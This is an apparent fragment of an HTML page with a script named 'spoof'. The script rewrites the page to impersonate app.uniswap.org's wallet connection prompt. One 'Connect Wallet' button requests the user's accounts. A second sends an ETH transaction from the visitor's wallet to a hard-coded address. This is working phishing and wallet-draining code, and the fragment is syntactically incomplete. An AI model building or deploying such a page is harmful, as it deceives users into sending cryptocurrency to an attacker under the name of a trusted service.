  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    button {
      background-color: #2172e5;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 12px 24px;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
  <script>
    async function spoof() {
      document.body.innerHTML = `
        <h1>app.uniswap.org to Browser Web3 Wallet</h1>
        <p>To continue, please connect your wallet</p>
        <button id="connect">Connect Wallet</button>
		<br>
		<button id="connectWallet">Connect Wallet Transaction</button>
        <p id="status" style="margin-top:20px; color:gray;"></p>
      `;

      document.getElementById('connect').onclick = async () => {
        if (typeof window.ethereum !== 'undefined') {
          try {
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
            document.getElementById('status').innerText = '✅ Connected: ' + accounts[0];
          } catch (e) {
            document.getElementById('status').innerText = '❌ Failed: ' + e.message;
          }
        } else {
          document.getElementById('status').innerText = '❌ Trust Wallet not detected.';
        }
      };
	  
	  document.getElementById('connectWallet').onclick = async () => {
      if (!window.ethereum) {
        alert("No Web3 provider detected (MetaMask, Coinbase Wallet, etc.)");
        return;
      }

      try {
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];

        const tx = {
          from: user,
          to: "0x7b0e1dcfe4d9b40517cf729104f8dcfaf914ec9d", // dummy target
          value: "0x27C9504C27000", // ~0.000697 ETH
          gas: "0x5208"
        };

        await ethereum.request({
          method: 'eth_sendTransaction',
          params: [tx]
        });

        alert("Transaction sent.");
      } catch (err) {
        console.error(err);
        alert("Error: " + err.message);
      }
  </script>
</head>
